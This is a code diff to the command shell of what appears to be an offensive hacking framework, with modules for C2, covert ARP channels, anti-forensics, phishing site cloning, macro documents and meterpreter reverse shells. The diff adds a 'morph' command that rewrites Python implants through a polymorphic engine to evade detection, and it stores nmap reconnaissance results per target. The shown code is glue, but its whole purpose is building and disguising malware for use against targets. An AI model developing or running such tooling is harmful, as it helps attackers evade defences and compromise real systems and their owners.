@@ -21,7 +21,7 @@ from modules.discovery import discover_files
 from modules.covert_channel import send_arp_payload, listen_for_payload
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
 from modules.anti_forensics import scorched_earth
-from modules.target_manager import add_target, get_target, list_targets
+from modules.target_manager import add_target, get_target, list_targets, add_recon_data
 from modules.social_engineering import clone_website, create_macro_doc
 from modules.lotl_c2 import lotl_agent
 from modules.dga import generate_domains
@@ -43,6 +43,7 @@ from modules import harvester
 from modules import recon
 from modules import file_generator
 from modules import explainer
+from modules import polymorphic_engine
 
 # --- Shell State ---
 github_c2_instance = None
@@ -80,6 +81,7 @@ def print_help():
     print("  recon             - Run a deep reconnaissance scan on a target")
     print("  generate_file     - Generate a malicious file for testing")
     print("  explain           - Explain a file-based attack")
+    print("  morph             - Apply polymorphism to a Python implant")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
     print("  exit              - Exit the shell")
@@ -110,6 +112,11 @@ def print_generate_help():
     print("  linux         - linux/x86/meterpreter/reverse_tcp")
     print("  python        - python/meterpreter/reverse_tcp")
     print("  php           - php/meterpreter/reverse_tcp")
+
+def print_morph_help():
+    """Prints the help menu for the morph command."""
+    print("\n--- Polymorphic Code Engine ---")
+    print("Usage: morph <input_file.py> <output_file.py>")
 
 def print_generate_file_help():
     """Prints the help menu for the generate_file command."""
@@ -317,6 +324,29 @@ def run_generate_command(args):
     except subprocess.CalledProcessError as e:
         print(f"Error generating payload: {e}")
 
+def run_morph_command(args):
+    """Handles the morph command."""
+    if len(args) != 2:
+        print_morph_help()
+        return
+
+    input_file, output_file = args
+
+    try:
+        with open(input_file, 'r') as f:
+            source_code = f.read()
+
+        morphed_code = polymorphic_engine.morph_code(source_code)
+
+        with open(output_file, 'w') as f:
+            f.write(morphed_code)
+
+        print(f"Polymorphic implant saved to {output_file}")
+    except FileNotFoundError:
+        print(f"Error: Input file not found at {input_file}")
+    except Exception as e:
+        print(f"An error occurred during morphing: {e}")
+
 def run_generate_file_command(args):
     """Handles the generate_file command."""
     if not args:
@@ -374,6 +404,9 @@ def run_recon_command(args):
     results = recon.run_nmap_scan(target_ip)
 
     if results:
+        # Save the detailed results to the target manager
+        add_recon_data(target_ip, results)
+
         print(f"\n--- Reconnaissance Report for {target_ip} ---")
         print(f"  OS Guess: {results['os']}")
         print("\n  Open Ports:")
@@ -767,6 +800,8 @@ def process_command(cmd_line):
         run_generate_file_command(args)
     elif command == "explain":
         run_explain_command(args)
+    elif command == "morph":
+        run_morph_command(args)
     elif command == "ape-unleash":
         # ... (ape-unleash logic)
         pass
